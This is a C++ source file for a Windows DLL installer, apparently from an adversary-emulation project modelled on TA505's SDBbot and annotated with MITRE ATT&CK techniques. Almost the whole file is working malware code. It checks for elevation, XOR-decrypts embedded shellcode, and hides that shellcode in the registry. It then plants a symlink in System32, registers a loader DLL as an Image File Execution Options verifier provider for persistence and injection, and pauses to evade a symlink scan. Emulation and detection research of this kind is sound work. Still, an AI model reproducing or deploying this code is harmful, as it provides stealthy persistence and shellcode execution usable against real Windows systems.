#include "installer.hpp"
#include "resources.hpp"
#include "shellcode.hpp"
#include "drop.hpp"
#include "verifier.hpp"
#include "transactions.hpp"
#include "files.hpp"
#include "xor_obfuscation.hpp"
#include "xor.hpp"
#include <print>
#include <vector>
#include <xor_logger.hpp>

using common::unique_handle, common::windows_error;
using std::expected, std::unexpected, std::span, std::byte;

HMODULE g_this_dll = nullptr;

void fatal_error(const windows_error& error) {
    common::LogError(error.what());
    exit(EXIT_FAILURE);
}

/*
 * check_priv:
 *      About:
 *          Ensure that the current process is elevated, exiting with an error code if not.
 *          Relevant API calls: GetCurrentProcess, OpenProcessToken, GetTokenInformation.
 *      Result:
 *          Early termination if not elevated.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      CTI:
 */
void check_priv() {
    unique_handle token_handle;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token_handle.addressof())) {
        fatal_error(common::get_last_error(XOR_LIT("OpenProcessToken failed: ")));
    }

    TOKEN_ELEVATION te = {};
    DWORD return_length = 0;
    if (!GetTokenInformation(token_handle.get(), TokenElevation, &te, sizeof(TOKEN_ELEVATION), &return_length)) {
        fatal_error(common::get_last_error(XOR_LIT("GetTokenInformation failed: ")));
    }

    if (te.TokenIsElevated == 0) { // non zero if elevated
        common::LogError(XOR_LIT("Token is not elevated, exiting."));
        exit(EXIT_FAILURE);
    }
}

/*
 * install:
 *      About:
 *          Exported function to be called by rundll32. Performs main installer logic to set
 *          up image file execution options injection to trigger loader DLL execution to
 *          eventually execute the embedded shellcode:
 *              - initialize logger
 *              - verify elevated privileges
 *              - Write embedded shellcode blob resource to the registry
 *              - Create a symlink in C:\Windows\System32 to point to the loader DLL
 *              - Register the loader DLL as a verifier provider DLL for the target process
 *              - Drop the loader DLL
 *      Result:
 *          Set up the image file execution options injection by dropping the loader DLL to disk,
 *          storing the shellcode blob in registry, and performing the necessary registry writes
 *          to register the loader DLL as the target process' verifier provider DLL.
 *      MITRE ATT&CK Techniques:
 *          T1546.012: Event Triggered Execution: Image File Execution Options Injection
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 *          https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
 */
void CALLBACK install(HWND, HINSTANCE, char*, int) {
#if DEBUG
    bool debug = true;
#else
    bool debug = false;
#endif
    std::vector<unsigned char> key{ 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P' }; // change for prod
    char pwd[MAX_PATH]{};
    GetCurrentDirectoryA(MAX_PATH, pwd);
    std::string path = std::string(pwd) + XOR_LIT("\\installer.log"); // change for prod
    common::InitializeLogger(path, key);
    
    common::LogInfo(XOR_LIT("Installer export executed"));

    // Ensure that we have elevated privileges
    common::LogInfo(XOR_LIT("Checking token for elevated privileges"));
    check_priv();
    common::LogSuccess(XOR_LIT("Privilege check passed, running in elevated context"));

    // Locate shellcode resource in this DLL.
    auto shellcode_xor = read_resource(SHELLCODE, g_this_dll);
    if (!shellcode_xor) {
        fatal_error(shellcode_xor.error());
    }
    common::LogSuccess(XOR_LIT("Read shellcode from embedded resource"));

    // Decrypt shellcode resource. Need to make a writeable buffer since the resource data is read-only.
    std::vector<std::byte> shellcode_v;
    shellcode_v.reserve(shellcode_xor.value().size());
    shellcode_v.assign(shellcode_xor.value().begin(), shellcode_xor.value().end());
    xor_crypt::XorInPlace(shellcode_v.data(), shellcode_v.size(), xor_crypt::XorKeyBytes);
    std::span<std::byte> shellcode_dec(shellcode_v);
    common::LogSuccess(XOR_LIT("XOR-decrypted embedded shellcode"));

    auto transaction = common::create_transaction();
    if (!transaction) {
        fatal_error(transaction.error());
    }
    common::LogSuccess(XOR_LIT("Created transaction"));

    // Stash our shellcode at the registry location specified at compile-time.
    auto shellcode_registered = register_shellcode_transacted(
        transaction.value().get(),
        LR"()" SHELLCODE_KEY LOADER_SHELLCODE_KEY,
        LR"()" LOADER_SHELLCODE_VALUE,
        shellcode_dec
    );
    if (!shellcode_registered) {
        fatal_error(shellcode_registered.error());
    }
    common::LogSuccess(XOR_LIT("Registered shellcode"));

    // Drop a symlink in SYSTEM32 pointing to our loader.dll.
    auto symlink = common::create_symlink(
        transaction.value().get(),
        LR"(C:\Windows\System32\)" LOADER_SYMLINK,
        LR"()" LOADER_DROP_PATH,
        SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE
    );
    if (!symlink) {
        if (ERROR_ALREADY_EXISTS != symlink.error().code().value()) {
            fatal_error(symlink.error());
        }
    }
    common::LogSuccess(std::format(
        "Created symlink {} -> {}",
        R"(C:\Windows\System32\)" LOADER_SYMLINK,
        LOADER_DROP_PATH
    ));

    // Register the Verifier Provider DLL
    auto verifier_registered = register_verifier_transacted(
        transaction.value().get(),
        LR"()" IFEO_KEY IFEO_TARGET_PROCESS,
        LR"()" LOADER_SYMLINK
    );
    if (!verifier_registered) {
        fatal_error(verifier_registered.error());
    }
    common::LogSuccess(std::format(
        "{} registered as Verifier Provider DLL for {}",
        LOADER_SYMLINK,
        IFEO_TARGET_PROCESS
    ));

    auto committed = common::commit_transaction(transaction.value().get());
    if (!committed) {
        fatal_error(committed.error());
    }
    common::LogSuccess(XOR_LIT("Transaction committed"));

    // Pause to avoid SYSTEM32 symlink scan
    Sleep(3000);

    auto dropped = drop_loader(LR"()" LOADER_DROP_PATH);
    if (!dropped) {
        fatal_error(dropped.error());
    }
    common::LogSuccess(std::format("XOR-decrypted loader written to {}", LOADER_DROP_PATH));
}

extern "C"
bool DllMain(HINSTANCE dll, unsigned long event, void*){
    switch (event) {
        case DLL_PROCESS_ATTACH:
        {
            g_this_dll = dll;
            break;
        }
    }
    return true;
}
